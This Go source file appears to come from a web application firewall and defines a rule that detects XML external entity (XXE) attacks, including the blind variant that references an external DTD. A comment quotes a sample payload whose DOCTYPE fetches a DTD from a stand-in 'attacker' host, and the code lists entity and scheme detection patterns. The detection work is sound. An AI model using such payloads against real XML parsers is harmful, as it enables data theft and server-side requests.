// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package core

import (
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/rules/op"
)

// xmlEntityOrExternalDTD reports an inline entity declaration or a document
// that fetches its DTD from somewhere else.
//
// # The half that was missing
//
// The rule matched "<!entity", "<!element", "%remote;" and "<!attlist", which
// covers the payload that declares its own entity. It did not cover the payload
// that declares none:
//
//	<?xml version="1.0"?>
//	<!DOCTYPE foo SYSTEM "http://attacker/x.dtd">
//	<foo>&e1;</foo>
//
// The entity lives in the fetched DTD, so the request carries no "<!ENTITY" for
// a literal to find. That is blind XXE, and it is the shape three of the
// corpus's four XXE misses take -- the request is a *reference* rather than a
// declaration.
//
// # Why SYSTEM and not PUBLIC
//
// A SYSTEM identifier is a URL the parser fetches, and a client sending data has
// no reason to name one: the schema a server validates against is the server's,
// not the request's. That reasoning is the same one the entity half rests on.
//
// PUBLIC is deliberately absent even though it also carries a fetchable system
// identifier, and the reason is XHTML:
//
//	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
//	    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
//
// That is what every XHTML document in existence begins with, and an application
// accepting an upload or a paste of one would be blocked on its first deploy.
// One corpus miss (CVE-2019-2616) uses PUBLIC with a forged public identifier
// and stays missed; blocking it would need an allowlist of well-known DTD hosts,
// which is the kind of list that goes stale silently. Naming the gap is better
// than shipping the list.
func xmlEntityOrExternalDTD() rules.Operator {
	declarations := []string{"<!entity", "<!element", "%remote;", "<!attlist"}
	// Schemes a parser will actually dereference. "file://" is included because
	// an external DTD read from disk is the local-file variant of the same
	// attack, and unlike a bare "file://" in a value it is unambiguous here:
	// the DOCTYPE says the parser is meant to fetch it.
	schemes := []string{"http://", "https://", "ftp://", "file://", "jar:", "netdoc:"}

	return op.Func("xml_entity_or_external_dtd", func(v []byte) bool {
		for _, d := range declarations {
			if indexOfFold(v, d) >= 0 {
				return true
			}
		}
		i := indexOfFold(v, "<!doctype")
		if i < 0 {
			return false
		}
		rest := v[i:]
		if indexOfFold(rest, "system") < 0 {
			return false
		}
		for _, s := range schemes {
			if indexOfFold(rest, s) >= 0 {
				return true
			}
		}
		return false
	}).WithLiterals("<!entity", "<!element", "%remote;", "<!attlist", "<!doctype")
}
